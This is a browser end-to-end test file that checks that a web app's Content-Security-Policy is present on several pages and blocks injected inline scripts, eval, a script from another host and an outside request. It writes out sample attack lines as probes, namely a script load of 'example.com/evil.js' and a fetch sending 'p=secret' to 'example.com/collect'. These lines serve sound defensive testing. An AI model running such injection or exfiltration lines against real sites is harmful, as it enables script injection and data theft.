import { expect, test } from "../fixtures.js";

/** The Content-Security-Policy (src/core/csp.ts, #147) is in every page and holds. */
const PAGES = [
	"",
	"match/",
	"report/",
	"statistics/",
	"statistics/sasongsrapport/",
	"statistics/anteckningar/",
	"about/",
];

test.describe("Content-Security-Policy", () => {
	for (const path of PAGES) {
		test(`/${path} carries the policy`, async ({ page }) => {
			await page.goto(path);
			const policy = page.locator('meta[http-equiv="Content-Security-Policy"]');
			await expect(policy).toHaveCount(1);
			const content = (await policy.getAttribute("content")) ?? "";
			expect(content).toContain("script-src 'self'");
			expect(content).toContain("object-src 'none'");
		});
	}

	test("an injected inline script does not run", async ({
		page,
		cspViolations,
	}) => {
		await page.goto("statistics/");
		await page.evaluate(() => {
			const script = document.createElement("script");
			script.textContent = "window.__ran = 1";
			document.head.append(script);
		});
		await expect.poll(() => cspViolations.length).toBeGreaterThan(0);
		expect(
			await page.evaluate(
				() => (window as unknown as { __ran?: number }).__ran,
			),
		).toBeUndefined();
		cspViolations.length = 0;
	});

	test("a script from another host is not loaded", async ({
		page,
		cspViolations,
	}) => {
		await page.goto("statistics/");
		await page.evaluate(() => {
			const script = document.createElement("script");
			script.src = "https://example.com/evil.js";
			document.head.append(script);
		});
		await expect.poll(() => cspViolations.length).toBeGreaterThan(0);
		cspViolations.length = 0;
	});

	test("eval is refused to the page's own scripts", async ({
		page,
		cspViolations,
	}) => {
		// A script from the page's own origin (allowed), asking to eval. Code
		// run through the test driver is not under the page's policy, so the
		// probe has to be one of the page's own scripts.
		await page.route("**/probe.js", (route) =>
			route.fulfill({
				contentType: "application/javascript",
				body: "try { new Function('return 1')(); window.__eval = 'ran'; } catch { window.__eval = 'refused'; }",
			}),
		);
		await page.goto("statistics/");
		await page.evaluate(() => {
			const script = document.createElement("script");
			script.src = "/probe.js";
			document.head.append(script);
		});
		await expect
			.poll(() =>
				page.evaluate(() => (window as unknown as { __eval?: string }).__eval),
			)
			.toBe("refused");
		cspViolations.length = 0;
	});

	test("a request to a host that is not the app or Google is not sent", async ({
		page,
		cspViolations,
	}) => {
		await page.goto("statistics/");
		const sent: string[] = [];
		page.on("request", (request) => {
			if (new URL(request.url()).hostname === "example.com") {
				sent.push(request.url());
			}
		});
		const outcome = await page.evaluate(() =>
			fetch("https://example.com/collect?p=secret").then(
				() => "sent",
				() => "refused",
			),
		);
		expect(outcome).toBe("refused");
		expect(sent).toEqual([]);
		await expect.poll(() => cspViolations.length).toBeGreaterThan(0);
		cspViolations.length = 0;
	});
});
